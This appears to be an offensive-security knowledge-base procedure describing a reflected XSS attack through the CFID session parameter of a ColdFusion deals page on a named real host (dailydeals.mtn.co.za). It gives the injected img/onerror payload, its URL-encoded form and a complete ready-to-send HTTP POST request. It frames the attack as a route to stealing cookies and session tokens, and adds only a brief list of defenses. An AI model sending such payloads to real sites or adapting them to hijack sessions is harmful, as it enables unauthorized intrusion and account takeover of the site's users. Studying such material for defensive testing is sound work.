---
tags:
  - xss
  - payload
  - coldfusion
type: procedure
tools:
  - '[[tools/Burp-Suite-Professional]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/Exploit-CSRF-XSS-POST]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.439Z'
sub_techniques: []
id: e7e381ec-1fbc-4c01-8167-b1c79307c4c3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-XSS-Payload-in-CFID

## Summary

This procedure crafts a reflected XSS payload within the CFID parameter of a POST request to the MTN Daily Deals endpoint, exploiting poor sanitization to inject and execute JavaScript.

## Description

The CFID parameter, intended for session identification in ColdFusion, is reflected back into the HTML response without encoding. By appending an XSS payload to a valid UUID format, such as "><img src=x onerror=alert(document.domain)>, the attacker injects script that executes in the victim's browser upon reflection. This leads to access to cookies, local storage, and session tokens for impersonation.

## Requirements

1. Valid session or proxy setup with Burp Suite
2. Knowledge of URL encoding for payloads
3. Target endpoint confirmed vulnerable from prior recon

## Defense

Defensive measures and detection strategies:

- Sanitize and encode all user inputs, especially session params
- Use Content Security Policy (CSP) to block inline scripts
- Log and alert on suspicious parameter lengths or content in CFID

## Objectives

1. Inject HTML-breaking payload into CFID
2. Ensure reflection triggers onerror JavaScript
3. Validate execution for data exfiltration potential

## Instructions

### Step 1: Encode the Payload

**Context**: Prepare the XSS string to evade basic filters while fitting UUID format.

Construct: fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e"><img src=x onerror=alert(document.domain)>
URL-encode to: fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E

### Step 2: Inject and Test Payload

**Context**: Modify the POST request to include the payload and send it.

**Command** ([[commands/Exploit-CSRF-XSS-POST]]):

```http
POST /index.cfm?GO=DEALS HTTP/1.1
Host: dailydeals.mtn.co.za
Content-Type: application/x-www-form-urlencoded

CFID=fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E&CFTOKEN=0&category_id=9&cpID=1&location_id=0&m=1
```

> This sends the forged request; inspect the response for reflected CFID containing the img tag, which triggers the alert on load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/Exploit-CSRF-XSS-POST]]

## Tools Used

- [[tools/Burp-Suite-Professional]]

## Tags

- [[xss]]
- [[coldfusion]]
